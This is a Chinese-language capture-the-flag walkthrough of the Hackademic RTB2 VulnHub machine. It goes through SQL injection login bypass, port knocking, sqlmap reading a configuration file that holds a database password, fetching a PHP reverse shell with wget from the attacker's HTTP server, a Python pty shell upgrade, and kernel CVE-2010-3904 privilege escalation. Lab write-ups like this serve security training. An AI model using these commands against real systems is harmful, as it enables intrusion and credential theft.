# Hackademic: RTB2

项目地址：https://download.vulnhub.com/hackademic/Hackademic.RTB2.zip

是一个打包好的镜像文件

**注意：导入 vmx 时一定要选择我已移动，否则没网**

使用 Nmap 扫描出开放服务及操作系统版本

![](https://pic1.imgdb.cn/item/6972bf172d08d4bddaa76a1f.png)

666 端口被过滤了，访问 80 端口

![](https://pic1.imgdb.cn/item/6972c0912d08d4bddaa76ae0.png)

## SQL 注入

### 80

使用万能密码登录成功

```sql
' or 1=1--'
' or 1=1--'
```

![](https://pic1.imgdb.cn/item/6972c1052d08d4bddaa76ae2.png)

查看页面源代码发现提示

![](https://pic1.imgdb.cn/item/6972c1232d08d4bddaa76ae4.png)

解密拿到提示

![](https://pic1.imgdb.cn/item/6972c1882d08d4bddaa76ae8.png)

![](https://pic1.imgdb.cn/item/6972c1ab2d08d4bddaa76ae9.png)

### 666

测试发现这个页面存在 SQL 注入

![](https://pic1.imgdb.cn/item/6972d8162d08d4bddaa78257.png)

![](https://pic1.imgdb.cn/item/6972d8482d08d4bddaa78264.png)

## Port Knocking

**Port Knocking** 是一种通过在闭合的端口上产生一系列特定的连接尝试（敲门），来触发防火墙临时开放特定服务端口的机制

特征：用 nmap 扫描，会显示 `filtered`

客户端按照约定的顺序向服务器的一组闭合端口发送数据包。例如：先访问 7000 端口，再访问 8000 端口，最后访问 9000 端口

```bash
# -r 表示按顺序依次扫描端口
nmap -r -p 1001,1101,1011,1001 192.168.202.152
```

![](https://pic1.imgdb.cn/item/6972c7a52d08d4bddaa77144.png)

再次扫描发现 666 端口开放

![](https://pic1.imgdb.cn/item/6972c7972d08d4bddaa77143.png)

访问是个 Web 界面

![](https://pic1.imgdb.cn/item/6972c7ce2d08d4bddaa77148.png)

## RCE

### 666

继 SQL 注入后直接 `--os-shell` 发现可以插入木马，有一个我们的可读文件

![](https://pic1.imgdb.cn/item/6972db802d08d4bddaa78609.png)

## 弱口令

### phpMyAdmin

执行

```bash
sqlmap -u "http://192.168.1.9:666/index.php?option=com_abc&view=abc&letter=List+of+content+items...&Itemid=3" \
    --file-read="/var/www/configuration.php"
```

拿到账号密码

```
root:yUtJklM97W
```

成功登录进 phpMyAdmin 后台

![](https://pic1.imgdb.cn/item/6972dc6b2d08d4bddaa7871f.png)

## 提权

### PHP 反弹 Shell

编写好文件开启 HTTP 服务

![](https://pic1.imgdb.cn/item/6972e72d2d08d4bddaa79179.png)

通过之前的 SQL Shell 下载文件

```bash
# 中间有两个空格
wget  http://192.168.202.128:8989/reverse.php
```

![](https://pic1.imgdb.cn/item/6972e7c82d08d4bddaa791e1.png)

网页端运行木马

![](https://pic1.imgdb.cn/item/6972e7e92d08d4bddaa791f2.png)

收到请求建立连接

![](https://pic1.imgdb.cn/item/6972e8092d08d4bddaa79213.png)

### Python 升级为交互式 Shell

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
```

![](https://pic1.imgdb.cn/item/6972e83a2d08d4bddaa7922c.png)

### 内核 CVE-2010-3904

根据内核版本搜索漏洞发现这个编号的漏洞可以打

![](https://pic1.imgdb.cn/item/6972f4006d97d43cfd4676f0.png)

快速定位到位置

![](https://pic1.imgdb.cn/item/6972f41f6d97d43cfd4676fb.png)

通过 HTTP 服务传到靶机上编译运行提权成功

![](https://pic1.imgdb.cn/item/6972f3786d97d43cfd4676b4.png)
